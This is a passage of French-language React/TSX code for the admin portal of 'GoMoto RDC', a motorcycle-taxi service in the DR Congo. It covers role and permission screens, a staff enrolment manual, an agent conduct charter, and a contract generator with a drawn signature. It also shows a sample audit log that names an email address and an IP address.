                          </span>
                        </div>
                      </div>

                      {/* Privileges Badge lists */}
                      <div className="space-y-1 pt-1.5 border-t border-slate-150">
                        <span className="text-[8px] font-black text-slate-450 uppercase block tracking-wider">
                          Privilèges d'administration accordés :
                        </span>
                        <div className="flex flex-wrap gap-1 mt-1">
                          {admin.privileges.includes("full_access") && (
                            <span className="bg-red-50 text-red-750 border border-red-100 text-[8.5px] rounded-lg px-2 py-0.5 font-mono font-bold">
                              ★ Accès Complet (Full)
                            </span>
                          )}
                          {admin.privileges.includes("arbitration_rights") && (
                            <span className="bg-blue-50 text-blue-750 border border-blue-100 text-[8.5px] rounded-lg px-2 py-0.5 font-mono">
                              📂 Arbitre des recours
                            </span>
                          )}
                          {admin.privileges.includes("fiscal_approvals") && (
                            <span className="bg-emerald-50 text-emerald-750 border border-emerald-100 text-[8.5px] rounded-lg px-2 py-0.5 font-mono">
                              🪙 Auditeur Fiscal permis
                            </span>
                          )}
                          {admin.privileges.includes("sos_dispatching") && (
                            <span className="bg-orange-50 text-orange-750 border border-orange-100 text-[8.5px] rounded-lg px-2 py-0.5 font-mono">
                              🚨 Répartiteur Urgences SOS
                            </span>
                          )}
                        </div>
                      </div>

                      {/* Delegation Status Action Toggle & Identity Card Button */}
                      <div className="pt-2 flex justify-between items-center gap-2 border-t border-slate-100 flex-wrap">
                        <button
                          type="button"
                          onClick={() => setSelectedIdCardAdmin(admin)}
                          className="px-3 py-1.5 rounded-lg font-black text-[9px] uppercase tracking-wider cursor-pointer border border-[#1E293B] bg-[#0F172A] text-slate-100 hover:bg-[#1E293B] transition-all flex items-center gap-1.5 shadow-sm"
                        >
                          <IdCard className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
                          <span>Voir Carte d'identité</span>
                        </button>

                        <button
                          type="button"
                          onClick={() => handleToggleAdminStatus(admin.email)}
                          className={`px-3 py-1.5 rounded-lg font-black text-[9px] uppercase tracking-wider cursor-pointer border transition-all ${
                            admin.status === "active"
                              ? "bg-red-50 text-red-650 hover:bg-red-100 border-red-200"
                              : "bg-emerald-50 text-emerald-750 hover:bg-emerald-100 border-emerald-250"
                          }`}
                        >
                          {admin.status === "active" ? "Régler d'office en statut REVOQUÉ" : "Réhabiliter les accès administrateur"}
                        </button>
                      </div>

                    </div>
                  );
                })}
              </div>

              {/* Logs simulation widget */}
              <div className="bg-slate-950 rounded-2xl p-4 font-mono text-[9px] text-slate-400 space-y-1.5 text-left border border-slate-800 mt-5">
                <div className="flex justify-between border-b border-slate-850 pb-1 flex-wrap font-sans text-[8.5px] text-slate-505">
                  <span className="font-bold">JOURNAL D'AUDIT SÉCURISÉ DES CO-DÉLÉGUÉS</span>
                  <span className="text-emerald-500 font-bold">● TEMPS RÉEL APN ACTIVE</span>
                </div>
                <div className="text-yellow-500">[06/06/2026] Établissement de la délégation principale autorisée pour lumulazard5@gmail.com</div>
                <div className="text-slate-300">[10/06/2026] Connexion réussie de lumulazard5@gmail.com depuis IP 197.142.222.18 (Kinshasa, Gombe)</div>
                <div className="text-emerald-500">[10/06/2026] Action de Lazard Lumula : Audit d'immatriculation de la flotte de taxi-motos de la province de Kinshasa</div>
                <div className="text-slate-400">[10/06/2026] Génération et certificat d'APN pro-moto crypté validé</div>
              </div>

            </div>

          </div>

        </div>
      )}

      {/* ================= ADMIN TAB: RÔLES & PERMISSIONS ================= */}
      {activeSubTab === "roles" && (
        <div className="space-y-6 animate-in fade-in duration-300">
          <div className="bg-purple-900 text-white p-6 rounded-3xl relative overflow-hidden shadow-lg border border-purple-950">
            <div className="absolute right-0 top-0 h-full w-1/3 bg-radial from-purple-700/50 to-transparent pointer-events-none"></div>
            <div className="relative z-10 flex flex-col md:flex-row gap-4 justify-between items-start md:items-center">
              <div>
                <h2 className="text-xl font-black mb-1.5 flex items-center gap-2">
                  <Key className="w-6 h-6 text-purple-300" /> Gestion des Rôles & Permissions
                </h2>
                <p className="text-purple-100 text-[11px] font-medium leading-relaxed max-w-2xl opacity-90">
                  Configurez le contrôle d'accès basé sur les rôles (RBAC) pour votre infrastructure GoMoto RDC.
                  Définissez précisément les privilèges des administrateurs, modérateurs, et agents locaux.
                </p>
              </div>
              <button 
                className="bg-white text-purple-900 px-5 py-2.5 rounded-xl text-xs font-black shadow transition-all hover:bg-purple-50 flex items-center gap-2"
                onClick={() => setShowRoleModal(true)}
              >
                <Plus className="w-4 h-4" /> Créer un Rôle
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Roles List */}
            <div className="lg:col-span-1 space-y-4">
              <h3 className="font-bold text-slate-800 text-sm flex items-center gap-2">
                <Shield className="w-4 h-4 text-purple-600" /> Rôles Système
              </h3>
              
              <div className="bg-white rounded-2xl border border-slate-200 overflow-hidden shadow-sm">
                {systemRoles.map((role) => (
                  <div 
                    key={role.id}
                    onClick={() => setSelectedRole(role.id)}
                    className={`p-4 border-b border-slate-100 flex items-center gap-3 cursor-pointer transition-colors ${
                      selectedRole === role.id ? `bg-${role.color}-50` : "hover:bg-slate-50"
                    }`}
                  >
                    <div className={`h-8 w-8 bg-${role.color}-${selectedRole === role.id ? '600' : '100'} text-${selectedRole === role.id ? 'white' : role.color + '-700'} rounded-lg flex items-center justify-center font-black border border-${role.color}-200`}>
                      {role.abbr}
                    </div>
                    <div className="flex-1">
                      <span className="block font-black text-xs text-slate-900">{role.name}</span>
                      <span className="block text-[9px] text-slate-500 font-medium">{role.desc}</span>
                    </div>
                    {selectedRole === role.id && <CheckCircle className={`w-4 h-4 text-${role.color}-600`} />}
                  </div>
                ))}
              </div>
            </div>

            {/* Permissions Matrix */}
            <div className="lg:col-span-2 space-y-4">
              <h3 className="font-bold text-slate-800 text-sm flex items-center gap-2">
                <ShieldCheck className={`w-4 h-4 text-${systemRoles.find(r => r.id === selectedRole)?.color || 'purple'}-600`} /> 
                Permissions du Rôle ({systemRoles.find(r => r.id === selectedRole)?.name})
              </h3>
              
              <div className="bg-white rounded-2xl border border-slate-200 shadow-sm overflow-hidden">
                <div className="px-4 border-b border-slate-200 h-10 flex items-center bg-slate-50 text-[10px] font-bold text-slate-500 uppercase tracking-widest">
                  <div className="flex-1">Ressource / Service</div>
                  <div className="w-16 text-center">Voir</div>
                  <div className="w-16 text-center">Créer</div>
                  <div className="w-16 text-center">Éditer</div>
                  <div className="w-16 text-center">Supprimer</div>
                </div>

                {[
                  { name: "Utilisateurs (Clients / Motards)", icon: <User className="w-4 h-4" /> },
                  { name: "Transactions & Wallets", icon: <CreditCard className="w-4 h-4" /> },
                  { name: "Flottes & Propriétaires", icon: <Building className="w-4 h-4" /> },
                  { name: "Courses & Historique", icon: <Map className="w-4 h-4" /> },
                  { name: "Système de Modération & SOS", icon: <ShieldAlert className="w-4 h-4" /> },
                  { name: "Configurations & Rôles", icon: <Key className="w-4 h-4" /> }
                ].map((resource, i) => (
                  <div key={i} className="px-4 py-3 border-b border-slate-100 flex items-center hover:bg-slate-50/50">
                    <div className="flex-1 flex items-center gap-2.5">
                      <span className="text-slate-400 p-1 bg-white border border-slate-200 rounded-md shadow-sm">
                        {resource.icon}
                      </span>
                      <span className="text-xs font-bold text-slate-800">{resource.name}</span>
                    </div>
                    <div className="w-16 flex justify-center">
                      <input type="checkbox" checked readOnly className="w-3.5 h-3.5 accent-purple-600 cursor-not-allowed" />
                    </div>
                    <div className="w-16 flex justify-center">
                      <input type="checkbox" checked readOnly className="w-3.5 h-3.5 accent-purple-600 cursor-not-allowed" />
                    </div>
                    <div className="w-16 flex justify-center">
                      <input type="checkbox" checked readOnly className="w-3.5 h-3.5 accent-purple-600 cursor-not-allowed" />
                    </div>
                    <div className="w-16 flex justify-center">
                      <input type="checkbox" checked readOnly className="w-3.5 h-3.5 accent-purple-600 cursor-not-allowed" />
                    </div>
                  </div>
                ))}
                
                <div className="p-4 bg-purple-50/50 border-t border-purple-100 flex justify-end gap-3 text-sm">
                  <button className="px-4 py-2 border border-slate-200 bg-white text-slate-600 rounded-xl font-bold cursor-not-allowed opacity-50 text-[11px]" disabled>
                    Annuler
                  </button>
                  <button className="px-5 py-2 bg-purple-600 text-white rounded-xl font-bold hover:bg-purple-700 shadow-sm transition-colors text-[11px]" onClick={() => alert("Les permissions du Super Administrateur sont verrouillées par sécurité.")}>
                    Enregistrer les Permissions
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ================= ADMIN TAB 8: MANUEL, POLITIQUES STAFF & CONTRAT D'ENGAGEMENT SIGNABLE ================= */}
      {activeSubTab === "cgu_staff" && (
        <div className="space-y-6 animate-in fade-in duration-300 text-slate-800 text-left">
          
          {/* Header */}
          <div className="bg-indigo-900 text-white p-6 rounded-3xl relative overflow-hidden shadow-lg border border-indigo-950 no-print">
            <div className="absolute right-0 top-0 h-full w-1/3 bg-radial from-indigo-700/50 to-transparent pointer-events-none"></div>
            <div className="relative z-10 space-y-2">
              <span className="bg-indigo-500 text-[10px] uppercase tracking-widest font-black px-2.5 py-1 rounded-full text-indigo-50">
                Portail Administratif Interne
              </span>
              <h2 className="text-xl font-black uppercase tracking-tight font-sans mt-1.5">
                Manuel Opérationnel & Chartes Réglementaires
              </h2>
              <p className="text-xs text-indigo-200 font-medium max-w-xl">
                Outils de pilotage, manuel d'enrôlement provincial et module de génération de contrats de prestations d'arbitrage routier en République Démocratique du Congo.
              </p>
            </div>
          </div>

          {/* Grid: Instructions & Staffing Plan */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start no-print">
            
            {/* COLUMN 1: Staffing Plan & Registration steps */}
            <div className="lg:col-span-7 space-y-6">
              
              {/* Proposal for 4 starting provinces */}
              <div className="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm space-y-4">
                <div className="flex items-center gap-2 border-b border-slate-100 pb-3">
                  <span className="p-1.5 bg-indigo-50 text-indigo-700 rounded-xl">
                    <Briefcase className="w-5 h-5" />
                  </span>
                  <div>
                    <h3 className="text-xs font-black text-slate-900 uppercase tracking-widest">
                      Plan d'Expansion Provincial & Staffing Clé
                    </h3>
                    <p className="text-[10px] text-slate-400 mt-0.5">Focus initial sur 4 Provinces Majeures de la RDC</p>
                  </div>
                </div>

                <p className="text-xs text-slate-600 leading-relaxed font-sans">
                  Pour initier un déploiement sécurisé et éradiquer la fraude et les tracasseries, GoMoto RDC amorce ses opérations dans quatre provinces stratégiques. L'implantation locale requiert un noyau de <b>cinq (5) profils administratifs clés</b> par antenne provinciale :
                </p>

                {/* The 4 Provinces cards */}
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 pt-1">
                  <div className="bg-blue-50/50 border border-blue-100 p-2.5 px-3 rounded-xl">
                    <span className="text-[10px] font-black text-blue-900 block font-mono">1. KINSHASA</span>
                    <span className="text-[8px] text-slate-500 uppercase font-bold tracking-wider">Moyeu Central</span>
                  </div>
                  <div className="bg-amber-50/50 border border-amber-100 p-2.5 px-3 rounded-xl">
                    <span className="text-[10px] font-black text-amber-900 block font-mono">2. KONGO CENTRAL</span>
                    <span className="text-[8px] text-slate-500 uppercase font-bold tracking-wider">Axe National</span>
                  </div>
                  <div className="bg-emerald-50/50 border border-emerald-100 p-2.5 px-3 rounded-xl">
                    <span className="text-[10px] font-black text-emerald-950 block font-mono">3. HAUT-KATANGA</span>
                    <span className="text-[8px] text-slate-500 uppercase font-bold tracking-wider">Axe Minière</span>
                  </div>
                  <div className="bg-purple-50/50 border border-purple-100 p-2.5 px-3 rounded-xl">
                    <span className="text-[10px] font-black text-purple-900 block font-mono">4. LUALABA</span>
                    <span className="text-[8px] text-slate-500 uppercase font-bold tracking-wider">Hub Logistique</span>
                  </div>
                </div>

                {/* Profiles Cards */}
                <div className="space-y-2.5 pt-2">
                  <div className="bg-slate-50 p-3.5 rounded-2xl border border-slate-150 flex items-start gap-3">
                    <span className="bg-indigo-100 text-indigo-900 text-xs font-black p-1 rounded-lg w-5 h-5 flex items-center justify-center shrink-0">1</span>
                    <div className="text-left">
                      <b className="text-[11px] text-slate-900 font-extrabold uppercase">Chef d'Antenne Provincial (Commandant Local)</b>
                      <p className="text-[10px] text-slate-500 leading-normal mt-0.5">
                        Représente GoMoto auprès des ministères provinciaux des Transports et des services de l'ordre (PNC). Arbitre suprême régional, gère la conformité et supervise l'antenne logistique.
                      </p>
                    </div>
                  </div>

                  <div className="bg-slate-50 p-3.5 rounded-2xl border border-slate-150 flex items-start gap-3">
                    <span className="bg-indigo-100 text-indigo-900 text-xs font-black p-1 rounded-lg w-5 h-5 flex items-center justify-center shrink-0">2</span>
                    <div className="text-left">
                      <b className="text-[11px] text-slate-900 font-extrabold uppercase">Enquêteur d'Enrôlement & Identité Civile (Staff Admin)</b>
                      <p className="text-[10px] text-slate-500 leading-normal mt-0.5">
                        Enregistre, vérifie et valide l'exactitude des pièces d'identité (Cartes d'Électeur, Permis, Vignette). Saisit l'identité bancaire du motard et livre ses gilets équipés de codes de sécurité GoMoto.
                      </p>
                    </div>
                  </div>

                  <div className="bg-slate-50 p-3.5 rounded-2xl border border-slate-150 flex items-start gap-3">
                    <span className="bg-indigo-100 text-indigo-900 text-xs font-black p-1 rounded-lg w-5 h-5 flex items-center justify-center shrink-0">3</span>
                    <div className="text-left">
                      <b className="text-[11px] text-slate-900 font-extrabold uppercase">Auditeur de Comptes & Liaison Bancaire (M-Pesa / Rawbank)</b>
                      <p className="text-[10px] text-slate-500 leading-normal mt-0.5">
                        Liaison directe avec nos coopératives et partenaires financiers (Rawbank, Airtel Money, Orange Money). Valide les relevés bancaires, vérifie les balances et débloque les virements de retraits.
                      </p>
                    </div>
                  </div>

                  <div className="bg-slate-50 p-3.5 rounded-2xl border border-slate-150 flex items-start gap-3">
                    <span className="bg-indigo-100 text-indigo-900 text-xs font-black p-1 rounded-lg w-5 h-5 flex items-center justify-center shrink-0">4</span>
                    <div className="text-left">
                      <b className="text-[11px] text-slate-900 font-extrabold uppercase">Conseiller Juridique et Spécialiste Recours</b>
                      <p className="text-[10px] text-slate-500 leading-normal mt-0.5">
                        Traite les dossiers de recours soumis par les motards en cas de contestation, conseille les propriétaires sur la rédaction de leurs contrats de gérance et veille au respect strict du code routier.
                      </p>
                    </div>
                  </div>

                  <div className="bg-slate-50 p-3.5 rounded-2xl border border-slate-150 flex items-start gap-3">
                    <span className="bg-indigo-100 text-indigo-900 text-xs font-black p-1 rounded-lg w-5 h-5 flex items-center justify-center shrink-0">5</span>
                    <div className="text-left">
                      <b className="text-[11px] text-slate-900 font-extrabold uppercase">Chef de Dépêche d'Assistance & Gestion SOS Emergency</b>
                      <p className="text-[10px] text-slate-500 leading-normal mt-0.5">
                        Gère la sécurité active 24h/24. En cas de déclenchement d'un bouton SOS par un chauffeur ou un client, il localise en temps réel la balise GPS de l'appareil et guide par VoIP les brigades de secours local.
                      </p>
                    </div>
                  </div>
                </div>

              </div>

              {/* Instructions steps for registering different Profiles */}
              <div className="bg-white border border-slate-200 rounded-3xl p-6 shadow-sm space-y-4">
                <div className="flex items-center gap-2 border-b border-slate-100 pb-3">
                  <span className="p-1.5 bg-indigo-50 text-indigo-700 rounded-xl">
                    <BookOpen className="w-5 h-5" />
                  </span>
                  <div>
                    <h3 className="text-xs font-black text-slate-900 uppercase tracking-widest">
                      Procédures Système d'Enrôlement (Manuel Staff)
                    </h3>
                    <p className="text-[10px] text-slate-400 mt-0.5">Règles d'enregistrement de l'intégralité des Profils</p>
                  </div>
                </div>

                <div className="space-y-4 text-xs font-medium">
                  {/* Step A: Clients */}
                  <div className="space-y-1.5 border-l-2 border-purple-500 pl-3">
                    <span className="text-[10px] font-black text-purple-800 uppercase tracking-widest block font-sans">
                      A. Comment Enregistrer un Passager (Client)
                    </span>
                    <p className="text-[10.5px] text-slate-500 leading-relaxed font-normal">
                      L'enregistrement d'un client s'effectue généralement en ligne, mais en agence de proximité pour les campagnes de terrain :
                    </p>
                    <ul className="list-disc pl-4 space-y-1 text-[10.5px] text-slate-600 font-normal">
                      <li>Saisir son Prénom, Nom de famille et Numéro WhatsApp Congolais (commençant par <b>+243</b>).</li>
                      <li>Vérifier la validité du réseau cellulaire congolais.</li>
                      <li>Associer un numéro de Mobile Money actif (M-Pesa, Orange Money ou Airtel) comme canal de remboursement ou de versement initial.</li>
                    </ul>
                  </div>

                  {/* Step B: Chauffeurs */}
                  <div className="space-y-1.5 border-l-2 border-amber-500 pl-3">
                    <span className="text-[10px] font-black text-amber-700 uppercase tracking-widest block font-sans">
                      B. Comment Enregistrer un Conducteur (Motard Pro GoMoto)
                    </span>
                    <p className="text-[10.5px] text-slate-500 leading-relaxed font-normal">
                      L'accréditation d'un motard est l'action la plus sensible et critique de notre système d'identité d'État :
                    </p>
                    <ul className="list-disc pl-4 space-y-1 text-[10.5px] text-slate-600 font-normal">
                      <li><b>Identité civile</b> : Scanner l'original de son Permis de Conduire national de catégorie A et sa carte d'électeur congolaise active.</li>
                      <li><b>Moralité routière</b> : Archiver l'extrait de Casier Judiciaire ou attestation de Bonne vie et mœurs de moins de 3 mois.</li>
                      <li><b>Contrôle Technique</b> : Enregistrer physiquement la marque de la moto, le numéro de châssis et sa plaque d'immatriculation d'État (Ex: C-KIN-XXXX).</li>
                      <li><b>Actifs Bancaires</b> : Saisir et valider formellement sa carte Rawbank ou son numéro Mobile Money pour la ventilation des trajets.</li>
                      <li><b>Équipement GoMoto</b> : Remettre officiellement le Gilet Rétro-Réfléchissant officiel et le Casque Orné du logo. Configurer l'APN pro-moto crypté.</li>
                    </ul>
                  </div>

                  {/* Step C: Propriétaires */}
                  <div className="space-y-1.5 border-l-2 border-blue-500 pl-3">
                    <span className="text-[10px] font-black text-blue-800 uppercase tracking-widest block font-sans">
                      C. Comment Enregistrer un Propriétaire de Flotte
                    </span>
                    <p className="text-[10.5px] text-slate-500 leading-relaxed font-normal">
                      Pour intégrer et sécuriser les capitaux d'un investisseur congolais :
                    </p>
                    <ul className="list-disc pl-4 space-y-1 text-[10.5px] text-slate-600 font-normal">
                      <li>Exiger la justification de propriété (Originaux des Cartes Roses provinciales, taxes de roulage acquittées).</li>
                      <li>Enregistrer sa raison sociale officielle et un numéro de compte d'affrètement de retrait d'office (Rawbank, BCDC, TMB).</li>
                      <li>Faire signer en agence la Charte de répartition transparente de recettes, autorisant la plateforme à ventiler automatiquement les gains entre lui, GoMoto, et son Chauffeur.</li>
                    </ul>
                  </div>
                </div>

              </div>

            </div>

            {/* COLUMN 2: Legal texts viewer & contract simulator */}
            <div className="lg:col-span-5 space-y-6">
              
              {/* Dynamic Legal Text Reader */}
              <div className="bg-white border border-slate-200 rounded-3xl p-5 shadow-sm space-y-3">
                <div className="flex items-center justify-between border-b border-slate-100 pb-2">
                  <span className="text-[10px] font-black text-slate-900 uppercase tracking-widest block">
                    📖 Chartes & Textes Légaux RDC
                  </span>
                  <span className="text-[8.5px] font-mono text-indigo-650 bg-indigo-50 px-2 py-0.5 rounded font-bold">
                    Mis à jour RDC 2026
                  </span>
                </div>

                {/* Sub tabs inside the card to switch documents */}
                <div className="grid grid-cols-2 gap-1.5 bg-slate-100 p-1 rounded-xl">
                  <button
                    type="button"
                    onClick={() => setPolicyDocView("limits")}
                    className={`text-[9.5px] py-1.5 px-2 rounded-lg font-black uppercase tracking-wider text-center cursor-pointer transition ${
                      policyDocView === "limits" ? "bg-red-650 text-white shadow-sm border border-red-700 font-sans" : "text-slate-600 hover:bg-slate-200"
                    }`}
                  >
                    ⚠️ Limites des Agents
                  </button>
                  <button
                    type="button"
                    onClick={() => setPolicyDocView("legal_central")}
                    className={`text-[9.5px] py-1.5 px-2 rounded-lg font-black uppercase tracking-wider text-center cursor-pointer transition ${
                      policyDocView === "legal_central" ? "bg-indigo-600 text-white shadow-sm border border-indigo-700" : "text-slate-600 hover:bg-slate-200"
                    }`}
                  >
                    ⚖️ Centre Légal Unifié
                  </button>
                </div>

                {/* Show Limits & Anti-Fraud */}
                {policyDocView === "limits" && (
                  <div className="text-[11px] leading-relaxed text-slate-600 space-y-2.5 max-h-62 overflow-y-auto pr-1 text-left">
                    <p className="font-bold text-red-700 border-b border-red-100 pb-1 flex items-center gap-1.5">
                      <span>🛑</span> CHARTE STRICTE DE LIMITATION DES AGENTS PROVINCIAUX :
                    </p>
                    <div className="bg-red-50/50 border border-red-100/60 p-2.5 rounded-xl space-y-2 text-[10.5px]">
                      <p>
                        <b>1. Interdiction d'Encaissement de Fonds :</b> Nos agents n'exigent et ne perçoivent <b>strictement rien comme argent liquide ou valeur</b>. Tout mouvement financier (frais d'enrôlement, caution, transactions, rechargements) s'effectue par paiement mobile intégré ou Rawbank. Tout encaissement physique constitue un délit de fraude.
                      </p>
                      <p>
                        <b>2. Zéro Autonomie Financière & Validation DG :</b> Toutes les demandes de retrait de fonds, de modification de solde ou de validation de flotte soumises par un agent provincial sont <b>bloquées au statut de projet temporaire</b>. Elles doivent obligatoirement faire l'objet d'une contre-vérification, d'un accord formel et d'une co-signature numérique signés par le <b>Directeur Général ou les Propriétaires exclusifs de GoMoto RDC</b> avant d'être exécutées par le système.
                      </p>
                      <p>
                        <b>3. Prévention de la Fraude de Documents :</b> Obligation absolue de scanner l'original physique des permis de conduire d’État de classe A et des cartes d'électeurs. Aucune photocopie noir et blanc ou document provisoire non certifié n'est admis.
                      </p>
                      <p>
                        <b>4. Interdiction du Transport Non Autorisé :</b> Interdiction formelle d'autoriser le transport de personnes par des chauffeurs n'étant pas inscrits, n'ayant pas passé le contrôle de moralité (casier judiciaire vierge) ou n'étant pas personnellement validés dans la base d'État GoMoto RDC. Prêter un gilet ou un compte officiel GoMoto à un chauffeur tiers suspend immédiatement l'habilitation de l'antenne.
                      </p>
                      <p className="bg-indigo-950 text-indigo-100 p-2.5 rounded-xl font-mono text-[9px] leading-tight flex flex-col gap-1">
                        <span className="font-black text-[9.5px] uppercase text-cyan-400">📞 CONTACT UNIQUE NATIONAL RDC :</span>
                        <span>Toutes les provinces utilisent exclusivement ce numéro pour contacter la direction ou valider les dossiers :</span>
                        <b className="text-white text-[11.5px] tracking-widest text-center py-0.5 mt-0.5 bg-indigo-900 rounded border border-indigo-800 font-bold block">
                          +243 89 900 0000
                        </b>
                      </p>
                    </div>
                  </div>
                )}

                {/* Show Central Legal Hub linking directly to LegalCenter.tsx to avoid redundancy */}
                {policyDocView === "legal_central" && (
                  <div className="text-[11px] leading-relaxed text-slate-600 space-y-3 max-h-62 overflow-y-auto pr-1 text-left animate-in fade-in duration-200">
                    <p className="font-bold text-indigo-900 border-b border-indigo-100 pb-1 flex items-center gap-1.5">
                      <span>⚖️</span> UNION & CONSOLIDATION DES TEXTES DE LOI :
                    </p>
                    <p className="text-[10.5px]">
                      Pour éviter les doubles saisies et garantir l'alignement contractuel permanent des chauffeurs, propriétaires et utilisateurs, l'ensemble des chartes et règlements de GoMoto RDC de la Direction Générale sont consolidés au sein du <b>Centre Légal Unifié de l'application</b>.
                    </p>
                    <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-200 space-y-1.5 text-[10.5px]">
                      <span className="font-extrabold text-slate-800 block text-[9.5px] uppercase">Ressources Centralisées & Auditables :</span>
                      <ul className="list-disc pl-4 space-y-1 text-slate-550">
                        <li><b>Charte des Motards (CGU) :</b> Droits d'accises, garanties anti-tracasseries routières et émoluments de flotte.</li>
                        <li><b>Politique de Confidentialité :</b> Encadrement du tracking GPS de trajet et de la sécurité des données SIM.</li>
                        <li><b>Sûreté Routière RDC :</b> Protocole de signalement d'arbitrages et tolérance zéro PNC.</li>
                      </ul>
                    </div>
                    <p className="text-[10px] text-indigo-500 italic font-medium">
                      Note de direction : Utilisez l'onglet principal "Centre Légal / CGU" de l'application pour consulter l'intégralité dynamique de ces documents d'État ou pour émettre une question sémantique à l'IA d'arbitrage.
                    </p>
                  </div>
                )}
              </div>

              {/* Input for the Contract generator */}
              <div className="bg-gradient-to-tr from-slate-50 to-indigo-50/20 border border-slate-200 rounded-3xl p-5 shadow-sm space-y-4">
                <div className="flex items-center gap-1.5 border-b border-slate-150 pb-2">
                  <span className="text-lg">✒️</span>
                  <span className="text-[10px] font-black text-slate-900 uppercase tracking-widest">
                    Générateur de Contrats & Engagement Staff RDC
                  </span>
                </div>

                <div className="space-y-3">
                  <div className="space-y-1 text-left">
                    <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider">
                      Nom & Prénom de l'Agent / Prestataire
                    </label>
                    <input
                      type="text"
                      value={contractStaffName}
                      onChange={(e) => setContractStaffName(e.target.value)}
                      placeholder="Maitre Lazard Lumula"
                      className="w-full bg-white border border-slate-250 rounded-xl px-2.5 py-1.5 text-xs text-slate-800 outline-none focus:border-indigo-600 font-bold"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3 text-left">
                    <div className="space-y-1">
                      <label className="block text-[8.5px] font-black text-slate-500 uppercase tracking-wider">
                        N° Pièce Civile / Nationalité
                      </label>
                      <input
                        type="text"
                        value={contractStaffID}
                        onChange={(e) => setContractStaffID(e.target.value)}
                        placeholder="N° C.E. 05-442-998"
                        className="w-full bg-white border border-slate-250 rounded-xl px-2.5 py-1.5 text-xs text-slate-800 outline-none focus:border-indigo-600 font-mono font-bold"
                      />
                    </div>

                    <div className="space-y-1">
                      <label className="block text-[8.5px] font-black text-slate-505 uppercase tracking-wider">
                        Province d'Attribution
                      </label>
                      <select
                        value={contractProvince}
                        onChange={(e) => setContractProvince(e.target.value)}
                        className="w-full bg-white border border-slate-250 rounded-xl px-2.5 py-1.5 text-xs text-slate-805 font-bold outline-none cursor-pointer"
                      >
                        <option value="Kinshasa">Kinshasa</option>
                        <option value="Kongo Central">Kongo Central</option>
                        <option value="Haut-Katanga">Haut-Katanga</option>
                        <option value="Lualaba">Lualaba</option>
                        <option value="Kasaï Central">Kasaï Central</option>
                      </select>
                    </div>
                  </div>

                  <div className="space-y-1 text-left">
                    <label className="block text-[8.5px] font-black text-slate-505 uppercase tracking-wider">
                      Poste de Collaboration Contractuel
                    </label>
                    <select
                      value={contractRole}
                      onChange={(e) => setContractRole(e.target.value)}
                      className="w-full bg-white border border-slate-250 rounded-xl px-2.5 py-1.5 text-xs text-slate-805 font-bold outline-none cursor-pointer"
                    >
                      <option value="Agent d'Immatriculation & Enrôlement Civil">Agent d'Immatriculation & Enrôlement Civil</option>
                      <option value="Chef de Station Provinciale Principal">Chef de Station Provinciale Principal</option>
                      <option value="Conseiller Juridique & Arbitre Provincial">Conseiller Juridique & Arbitre Provincial</option>
                      <option value="Auditeur de Comptes & Liaison Bancaire">Auditeur de Comptes & Liaison Bancaire</option>
                      <option value="Régulateur de Trafic & Chef de Dépêche SOS">Régulateur de Trafic & Chef de Dépêche SOS</option>
                    </select>
                  </div>

                  {/* Draw Signature Box */}
                  <div className="space-y-1.5 text-left pt-1">
                    <div className="flex justify-between items-center">
                      <label className="block text-[8.5px] font-black text-indigo-950 uppercase tracking-wider">
                        ✍️ Signature Électronique Officielle de l'Administré
                      </label>
                      <button
                        type="button"
                        onClick={clearSignature}
                        className="text-[8.5px] text-red-500 hover:text-red-700 font-bold uppercase hover:underline"
                      >
                        Effacer
                      </button>
                    </div>

                    <div className="border-2 border-dashed border-slate-300 rounded-2xl overflow-hidden bg-slate-50 relative">
                      <canvas
                        ref={canvasRef}
                        width={400}
                        height={120}
                        onMouseDown={startDrawing}
                        onMouseMove={drawSignature}
                        onMouseUp={stopDrawing}
                        onMouseLeave={stopDrawing}
                        onTouchStart={startDrawing}
                        onTouchMove={drawSignature}
                        onTouchEnd={stopDrawing}
                        className="w-full h-[120px] block cursor-crosshair bg-stone-50"
                      />
                      {!contractSigned && (
                        <div className="absolute inset-0 flex justify-center items-center pointer-events-none text-slate-400 text-[10px] font-medium select-none">
                          Dessinez votre signature ici à la souris ou au doigt
                        </div>
                      )}
                    </div>

                    <div className="flex items-center gap-2 pt-1">
                      <input
                        type="checkbox"
                        id="sign_lock_chk"
                        checked={contractSigned}
                        onChange={(e) => setContractSigned(e.target.checked)}
                        className="rounded border-slate-300 text-indigo-600 cursor-pointer"
                      />
                      <label htmlFor="sign_lock_chk" className="text-[10px] font-bold text-slate-700 cursor-pointer select-none">
                        J'approuve les clauses réglementaires et scelle ma signature.
                      </label>
                    </div>
                  </div>

                  <div className="flex gap-2.5 pt-2">
                    <button
                      type="button"
                      onClick={() => {
                        if (!contractSigned) {
                          alert("Veuillez d'abord dessiner votre signature et cocher la case d'approbation.");
                          return;
                        }
                        window.print();
                      }}
                      className="flex-1 bg-indigo-600 hover:bg-indigo-700 text-white font-black text-[10.5px] uppercase tracking-widest py-2.5 px-4 rounded-xl flex items-center justify-center gap-1.5 shadow-md shadow-indigo-100 transition-all cursor-pointer"
                    >
                      <Printer className="w-4 h-4" />
                      <span>🖨️ Imprimer / Sauvegarder en PDF</span>
                    </button>
                  </div>

                </div>

              </div>

            </div>

          </div>

          {/* ================= PHYSICAL OFFICIAL SIGNED CONTRACT FOR PRINTING ONLY / DISPLAY IN PRINT MODALITY ================= */}
          <div className="bg-white border-4 border-indigo-950 p-10 rounded-2xl max-w-2xl mx-auto shadow-xl space-y-6 text-left text-xs font-sans relative print-only hidden">
            
            {/* Stamp of sovereignty RDC */}
            <div className="flex justify-between items-start border-b-2 border-indigo-950 pb-5">
              <div className="text-[10px] uppercase font-bold text-slate-800 leading-normal text-left">
                <b>RÉPUBLIQUE DÉMOCRATIQUE DU CONGO</b><br />
                REPRÉSENTATION SPÉCIALE DU TRANSPORT URBAIN
                <p className="text-[8px] text-slate-400 mt-1">SOUVERAINTÉ ET CONFORMITÉ NATIONALE DE SÉCURITÉ</p>
              </div>
              <div className="text-right">
